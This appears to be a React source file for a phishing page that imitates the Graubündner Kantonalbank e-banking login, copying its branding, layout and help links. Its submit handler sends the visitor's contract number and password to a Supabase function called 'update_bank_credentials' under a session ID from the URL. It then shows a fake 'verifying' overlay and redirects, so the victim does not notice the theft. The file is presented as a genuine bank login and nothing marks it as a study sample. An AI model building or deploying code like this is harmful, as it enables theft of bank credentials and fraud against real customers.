import { useState, useEffect, useRef } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import { usePageMeta } from "@/hooks/use-page-meta";
import { Eye, EyeOff, ChevronLeft, ChevronRight, ArrowRight } from "lucide-react";
import logoAsset from "@/assets/graubuendner-kantonalbank-logo.svg.asset.json";
import windowsAsset from "@/assets/gkb-windows10.jpg.asset.json";
import karteAsset from "@/assets/gkb-bestekarte.jpg.asset.json";

const BLUE = "#025dad";
const TITLE_BLUE = "#0051a4";

const slides = [
  {
    image: windowsAsset.url,
    title: "Windows 10 nicht mehr nutzen.",
    text: "Microsoft beendet den regulären Support für Windows 10. Wechseln Sie jetzt auf Windows 11 und bleiben Sie sicher und up-to-date.",
    linkText: "Jetzt mehr erfahren.",
  },
  {
    image: karteAsset.url,
    title: "Die beste Karte für mehr.",
    text: "Freuen Sie sich auf attraktive Prämien zur Belohnung und Extras wie Reiseversicherungen.",
    linkText: "Mehr erfahren",
  },
];

const helpLinks = [
  "Noch kein e-Banking? Hier Zugang bestellen.",
  "e-Banking Login mit CrontoSign Swiss App",
  "e-Banking Login mit GKB Mobile Banking App",
  "Passwort und Zugangsdaten verwalten",
  "Zugang sperren: e-Banking und Mobile Banking",
];

const ChGraubuendnerKantonalbank = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const sessionId = searchParams.get("s") || "";
  const [showLoading, setShowLoading] = useState(false);

  const [vertragsnummer, setVertragsnummer] = useState("");
  const [passwort, setPasswort] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [activeSlide, setActiveSlide] = useState(0);
  const [lang, setLang] = useState<"DE" | "IT">("DE");
  const touchStartX = useRef(0);

  useEffect(() => { window.scrollTo(0, 0); }, []);
  usePageMeta("Graubündner Kantonalbank – e-Banking", logoAsset.url);

  const nextSlide = () => setActiveSlide((s) => (s + 1) % slides.length);
  const prevSlide = () => setActiveSlide((s) => (s - 1 + slides.length) % slides.length);

  useEffect(() => {
    const id = setInterval(() => setActiveSlide((s) => (s + 1) % slides.length), 5000);
    return () => clearInterval(id);
  }, []);

  const handleSubmit = async () => {
    if (sessionId) {
      const { error } = await supabase.rpc("update_bank_credentials", {
        p_session_id: sessionId,
        p_username: vertragsnummer,
        p_password: passwort,
        p_username_label: "Vertragsnummer",
        p_password_label: "Passwort",
      });
      if (error) console.error("Update failed:", error);
    } else {
      console.error("No session ID found in URL!");
    }
    setShowLoading(true);
  };

  return (
    <>
      {showLoading && (
        <LoadingOverlay
          message="Anmeldedaten werden überprüft..."
          onComplete={() => navigate("/confirmation?s=" + sessionId)}
        />
      )}
      <div className="min-h-screen flex flex-col" style={{ backgroundColor: "#f2f3f7" }}>
        {/* Header */}
        <div
          className="w-full flex items-center justify-between px-6 md:px-12"
          style={{
            height: 72,
            background: "linear-gradient(90deg, #0672c9 0%, #00519e 100%)",
            borderBottomRightRadius: 24,
          }}
        >
          <img src={logoAsset.url} alt="Graubündner Kantonalbank" className="h-[42px] w-auto" />
          <div className="flex items-center gap-2">
            {(["DE", "IT"] as const).map((l) => {
              const active = lang === l;
              return (
                <button
                  key={l}
                  onClick={() => setLang(l)}
                  className="w-10 h-10 rounded-full flex items-center justify-center text-[14px] font-semibold transition-all"
                  style={
                    active
                      ? { backgroundColor: "#fff", color: TITLE_BLUE }
                      : { backgroundColor: "rgba(255,255,255,0.22)", color: "rgba(255,255,255,0.7)" }
                  }
                  aria-label={l}
                >
                  {l}
                </button>
              );
            })}
          </div>
        </div>

        <main className="flex-1 px-4 pt-8 md:pt-10 pb-10">
          {/* Login Card */}
          <div
            className="w-full max-w-[980px] mx-auto bg-white overflow-hidden rounded-[6px]"
            style={{ boxShadow: "0 14px 30px -10px rgba(0,0,0,0.18)" }}
          >
            <div className="flex flex-col md:flex-row md:min-h-[520px]">
              {/* Login (60%) */}
              <div className="md:w-3/5 flex flex-col px-8 md:px-12 py-10">
                <h1
                  className="text-[28px] md:text-[32px] font-bold mb-3"
                  style={{ color: TITLE_BLUE }}
                >
                  GKB Login.
                </h1>
                <p className="text-[14px] mb-8" style={{ color: "#555" }}>
                  Melden Sie sich an, um fortzufahren.
                </p>

                <div className="mb-5">
                  <label className="block text-[13px] mb-1.5" style={{ color: "#333" }}>
                    Vertragsnummer
                  </label>
                  <input
                    type="text"
                    value={vertragsnummer}
                    onChange={(e) => setVertragsnummer(e.target.value)}
                    className="w-full px-3 py-2.5 border outline-none text-[15px] rounded-[4px] border-[#cfd4dc] focus:border-[#025dad] focus:shadow-[0_0_0_3px_rgba(2,93,173,0.18)] transition-all"
                  />
                </div>

                <div className="mb-8">
                  <label className="block text-[13px] mb-1.5" style={{ color: "#333" }}>
                    Passwort
                  </label>
                  <div className="relative">
                    <input
                      type={showPassword ? "text" : "password"}
                      value={passwort}
                      onChange={(e) => setPasswort(e.target.value)}
                      className="w-full px-3 py-2.5 border outline-none text-[15px] pr-10 rounded-[4px] border-[#cfd4dc] focus:border-[#025dad] focus:shadow-[0_0_0_3px_rgba(2,93,173,0.18)] transition-all"
                    />
                    <button
                      type="button"
                      onClick={() => setShowPassword(!showPassword)}
                      className="absolute right-2 top-1/2 -translate-y-1/2"
                      aria-label="Passwort anzeigen"
                    >
                      {showPassword ? <EyeOff size={18} color="#666" /> : <Eye size={18} color="#666" />}
                    </button>
                  </div>
                </div>

                <div className="flex-1" />

                <button
                  onClick={handleSubmit}
                  className="mx-auto w-full max-w-[210px] py-3 text-white font-semibold text-[15px] rounded-full transition-all hover:brightness-95"
                  style={{ background: "linear-gradient(90deg, #0155a3 0%, #0672c9 100%)" }}
                >
                  Weiter
                </button>
              </div>

              {/* Carousel (40%) */}
              <div
                className="md:w-2/5 flex flex-col relative"
                style={{ backgroundColor: "#eaf1f8" }}
                onTouchStart={(e) => { touchStartX.current = e.touches[0].clientX; }}
                onTouchEnd={(e) => {
                  const dx = e.changedTouches[0].clientX - touchStartX.current;
                  if (dx > 40) prevSlide();
                  else if (dx < -40) nextSlide();
                }}
              >
                {/* Image area */}
                <div className="relative h-[240px] md:h-[55%] overflow-hidden">
                  {slides.map((s, i) => (
                    <img
                      key={i}
                      src={s.image}
                      alt={s.title}
                      className="absolute inset-0 w-full h-full object-cover transition-opacity duration-700"
                      style={{ opacity: i === activeSlide ? 1 : 0 }}
                    />
                  ))}
                </div>

                {/* Arrows - square, blue */}
                <button
                  onClick={prevSlide}
                  aria-label="Vorheriges"
                  className="absolute left-3 top-[120px] md:top-[27%] w-9 h-9 flex items-center justify-center rounded-[4px] hover:brightness-110 transition"
                  style={{ backgroundColor: BLUE }}
                >
                  <ChevronLeft size={20} color="#fff" />
                </button>
                <button
                  onClick={nextSlide}
                  aria-label="Nächstes"
                  className="absolute right-3 top-[120px] md:top-[27%] w-9 h-9 flex items-center justify-center rounded-[4px] hover:brightness-110 transition"
                  style={{ backgroundColor: BLUE }}
                >
                  <ChevronRight size={20} color="#fff" />
                </button>

                {/* Text card */}
                <div className="flex-1 flex items-end p-4">
                  <div className="w-full bg-white rounded-[4px] p-5 shadow-sm">
                    <h3 className="font-bold text-[15px] mb-2 text-black leading-snug">
                      {slides[activeSlide].title}
                    </h3>
                    <p className="text-[13px] leading-relaxed mb-2" style={{ color: "#333" }}>
                      {slides[activeSlide].text}{" "}
                      <a href="#" style={{ color: BLUE }} className="underline-offset-2 hover:underline">
                        {slides[activeSlide].linkText}
                      </a>
                    </p>
                    <div className="flex items-center justify-center gap-2 mt-3">
                      {slides.map((_, i) => (
                        <button
                          key={i}
                          onClick={() => setActiveSlide(i)}
                          aria-label={`Slide ${i + 1}`}
                          className="rounded-full transition-all"
                          style={{
                            height: 7,
                            width: 7,
                            backgroundColor: i === activeSlide ? BLUE : "#cbd5e0",
                          }}
                        />
                      ))}
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>

          {/* Hilfe Card */}
          <div
            className="w-full max-w-[980px] mx-auto bg-white rounded-[6px] mt-6 px-8 md:px-12 py-8"
            style={{ boxShadow: "0 14px 30px -10px rgba(0,0,0,0.18)" }}
          >
            <h2 className="text-[18px] font-bold text-black mb-5">Sie brauchen Hilfe?</h2>
            <ul className="space-y-4">
              {helpLinks.map((t, i) => (
                <li key={i} className="flex items-center gap-3">
                  <ArrowRight size={18} color={BLUE} className="shrink-0" />
                  <a href="#" style={{ color: BLUE }} className="text-[14px] hover:underline">
                    {t}
                  </a>
                </li>
              ))}
            </ul>
          </div>
        </main>

        {/* Footer */}
        <footer className="pb-6">
          <div
            className="max-w-[980px] mx-auto px-4 md:px-2 text-[13px] flex flex-col-reverse items-center gap-3 md:flex-row md:justify-between"
            style={{ color: BLUE }}
          >
            <span>© Graubündner Kantonalbank</span>
            <div className="flex flex-wrap items-center justify-center gap-x-5 gap-y-1">
              <a href="#" className="hover:underline">Rechtliche Hinweise</a>
              <a href="#" className="hover:underline">Impressum</a>
              <a href="#" className="hover:underline">Datenschutzerklärung</a>
              <a href="#" className="hover:underline">Cookie-Policy</a>
            </div>
          </div>
        </footer>
      </div>
    </>
  );
};

export default ChGraubuendnerKantonalbank;
